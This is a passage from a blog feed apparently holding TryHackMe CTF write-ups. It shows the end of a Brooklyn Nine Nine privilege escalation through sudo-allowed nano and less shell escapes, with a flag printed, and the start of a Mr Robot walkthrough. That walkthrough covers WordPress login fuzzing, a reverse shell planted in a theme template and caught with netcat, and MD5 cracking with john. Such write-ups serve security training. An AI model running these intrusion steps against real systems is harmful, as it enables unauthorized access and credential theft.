&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/bin/less /root/root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-- Creator : Fsociety2006 --
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Congratulations in rooting Brooklyn Nine Nine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Here is the flag: 63a9f0ea7bb98050796b649e85481845
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enjoy!!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The second one is that holt can use nano has a sudo:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> holt on brookly_nine_nine:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass, &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User holt may run the following commands on brookly_nine_nine:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>ALL&lt;span class="o">)&lt;/span> NOPASSWD: /bin/nano
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">amy holt jake
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># cd ..&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># cd root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># cat root.txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-- Creator : Fsociety2006 --
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Congratulations in rooting Brooklyn Nine Nine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Here is the flag: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>and the last is spawning a shell using jake:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> jake on brookly_nine_nine:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass, &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User jake may run the following commands on brookly_nine_nine:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>ALL&lt;span class="o">)&lt;/span> NOPASSWD: /usr/bin/less
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo /usr/bin/less /etc/profile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">!/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># cd root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># cat root.txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-- Creator : Fsociety2006 --
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Congratulations in rooting Brooklyn Nine Nine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Here is the flag: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enjoy!!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And that was it, maybe there are other methods to escalate, maybe using Amy, but I think that it’s enough for now.&lt;/p></description></item><item><title>Mr Robot CTF Writeup THM</title><link>https://simonefelici.github.io/p/mr-robot-ctf-writeup-thm/</link><pubDate>Mon, 22 Jan 2024 16:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/mr-robot-ctf-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1582266255765-fa5cf1a1d501?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Mr Robot CTF Writeup THM" />&lt;p>First of all I am going to do an nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV -p- 10.10.81.92
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-22 05:44 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.81.92
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.055s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65532&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp closed ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Site doesn&lt;span class="s1">&amp;#39;t have a title (text/html).
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|_http-server-header: Apache
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">443/tcp open ssl/http Apache httpd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|_http-title: Site doesn&amp;#39;&lt;/span>t have a title &lt;span class="o">(&lt;/span>text/html&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>www.example.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2015-09-16T10:45:03
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-09-13T10:45:03
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 123.10 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here we can see port 80 and 443 open.&lt;/p>
&lt;p>So I am going to expplore the web page.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This is the content of the web page.&lt;/p>
&lt;p>From this point I just went and enumerate the webpage.&lt;/p>
&lt;p>I also found the robots.txt which leads to the first flag.&lt;/p>
&lt;p>inside the robots.txt there is also the location to a dictionary:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sort Downloads/fsocity.dic &lt;span class="p">|&lt;/span> uniq &amp;gt; uniq.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I ran this command because there were repeated words.&lt;/p>
&lt;p>So, now I just need the username.&lt;/p>
&lt;p>I tried with wpscan but I got nothing, So I tried to FUZZ the username with the sictionary, which if it is in the wordlist, should get a different response size, because wordpress tells you if is just the password that is wrong.&lt;/p>
&lt;p>And that’s exactly what happened:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%201.png"
loading="lazy"
alt="pg"
>&lt;/p>
&lt;p>So, now I think of running the fuzzer again, with the username Elliot and with the dictionary as a password.&lt;/p>
&lt;p>And we got the password:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/pg.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>And I got in, from there I could create a reverse shell, but first let’s explore the dashboard.&lt;/p>
&lt;p>In the Users section wee see that there is another User:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Maybe it can be helpful later.&lt;/p>
&lt;p>We can create a reverse shell just by copy and paste the pentestermonkey reverse shell, in the 404 template.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Then start the listener in the machine and we are in:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.81.92&lt;span class="o">]&lt;/span> &lt;span class="m">50199&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux linux 3.13.0-55-generic &lt;span class="c1">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 12:10:26 up 1:29, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.88, 2.66
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We have 2 users:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/passwd &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;home&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:101:104::/home/syslog:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:x:1001:1001::/home/mysql:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">varnish:x:999:999::/home/varnish:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot:x:1002:1002::/home/robot:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can’t cd into varnish, but we can cd in robot.&lt;/p>
&lt;p>in his home we have 2 files:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -la
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total &lt;span class="m">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">2&lt;/span> root root &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">3&lt;/span> root root &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> ..
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-r-------- &lt;span class="m">1&lt;/span> robot robot &lt;span class="m">33&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> key-2-of-3.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> robot robot &lt;span class="m">39&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> password.raw-md5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see the first one can be opened only by robot, but the second one can be read by anyone:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat password.raw-md5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot:&amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And looks like we got the md5 hash of robot&lt;/p>
&lt;p>And we can simply brute force it:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>Raw-md5 pass.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>Raw-MD5 &lt;span class="o">[&lt;/span>MD5 128/128 AVX 4x3&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: no OpenMP support &lt;span class="k">for&lt;/span> this &lt;span class="nb">hash&lt;/span> type, consider --fork&lt;span class="o">=&lt;/span>&lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt; &lt;span class="o">(&lt;/span>robot&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:00 DONE &lt;span class="o">(&lt;/span>2024-01-22 07:19&lt;span class="o">)&lt;/span> 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s bonjour1..123092
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show --format=Raw-MD5&amp;#34;&lt;/span> options to display all of the cracked passwords reliably
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Using that we can use the command “su” to authenticate ourself as robot:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su robot
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After doing some enumeration, I noticed that we got a strange SUID:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
